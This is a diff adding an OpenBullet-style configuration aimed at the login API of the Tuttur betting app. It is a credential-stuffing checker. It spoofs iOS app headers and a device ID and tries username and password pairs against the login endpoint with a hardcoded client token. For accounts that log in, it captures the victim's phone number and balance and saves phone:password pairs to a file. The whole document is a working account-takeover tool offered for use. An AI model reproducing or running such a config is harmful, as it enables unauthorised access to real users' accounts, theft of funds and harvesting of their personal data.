@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "Api Tuttur",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-06T13:03:37.6227625+00:00",
+  "AdditionalInfo": "",
+  "Author": "KaraMeleKk",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GenerateGUID -> VAR "guid" 
+
+FUNCTION ToUppercase "<guid>" -> VAR "deviceid" 
+
+REQUEST POST "https://tapi.tuttur.com/v1/auth/login" 
+  CONTENT "{\"clientId\":\"IOSS\",\"clientToken\":\"w9igcsgeo16xj1dswz5t6yagu3okky6m\",\"password\":\"<PASS>\",\"deviceUnique\":\"<deviceid>\",\"deviceToken\":\"\",\"username\":\"<USER>\",\"remember\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: tapi.tuttur.com" 
+  HEADER "Platform: ios" 
+  HEADER "User-Agent: Tuttur/7 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "X-Device: iOS 15.3.1 / iPhone 13 Pro Max / 7.4.0" 
+  HEADER "X-Tuttur-Environment: ios" 
+  HEADER "X_TUTTUR_VERSION: 740" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Ban OR 
+    KEY "errorCode\": \"NETS1" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://tapi.tuttur.com/v1/player/profile/me" 
+  
+  HEADER "Host: tapi.tuttur.com" 
+  HEADER "Platform: ios" 
+  HEADER "token: <token>" 
+  HEADER "User-Agent: Tuttur/7 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "X-Device: iOS 15.3.1 / iPhone 13 Pro Max / 7.4.0" 
+  HEADER "X-Tuttur-Environment: ios" 
+  HEADER "X_TUTTUR_VERSION: 740" 
+
+PARSE "<SOURCE>" JSON "phone" CreateEmpty=FALSE -> CAP "Telefon" 
+
+REQUEST GET "https://tapi.tuttur.com/v1/player/balance" 
+  
+  HEADER "Host: tapi.tuttur.com" 
+  HEADER "Platform: ios" 
+  HEADER "token: <token>" 
+  HEADER "User-Agent: Tuttur/7 CFNetwork/1329 Darwin/21.3.0" 
+  HEADER "X-Device: iOS 15.3.1 / iPhone 13 Pro Max / 7.4.0" 
+  HEADER "X-Tuttur-Environment: ios" 
+  HEADER "X_TUTTUR_VERSION: 740" 
+
+PARSE "<SOURCE>" LR "\"totalMoney\":" "," CreateEmpty=FALSE -> CAP "Bakiye" 
+
+UTILITY File "Tuttur Telpass.txt" AppendLines "<Telefon>:<PASS>" 
+
